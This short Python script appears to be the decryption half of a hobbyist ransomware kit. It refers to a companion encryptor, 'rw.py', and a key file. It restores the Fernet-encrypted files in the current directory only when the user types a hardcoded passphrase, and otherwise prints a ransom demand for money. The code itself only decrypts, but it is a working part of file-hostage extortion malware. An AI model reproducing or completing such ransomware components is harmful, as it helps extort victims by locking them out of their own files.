import os
from cryptography.fernet import Fernet

files =[]
for file in os.listdir():

    if file =='rw.py' or file == 'seckey.key' or file =='decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)

with open("seckey.key","rb")as k:
    secretkey =k.read()

secret_phrase="Vishwa"

user_entry =input("enter secret code for decrept yuur files")

if user_entry==secret_phrase :
    for file in files :
        with open(file, 'rb') as theFile :
           content = theFile.read()
        decrypted_content = Fernet(secretkey).decrypt(content)

        with open(file, 'wb') as thefile :
           thefile.write(decrypted_content)
           
           
    print("greate decrepted your files")
else :
    print("wrong passcode give the money for decrypted")
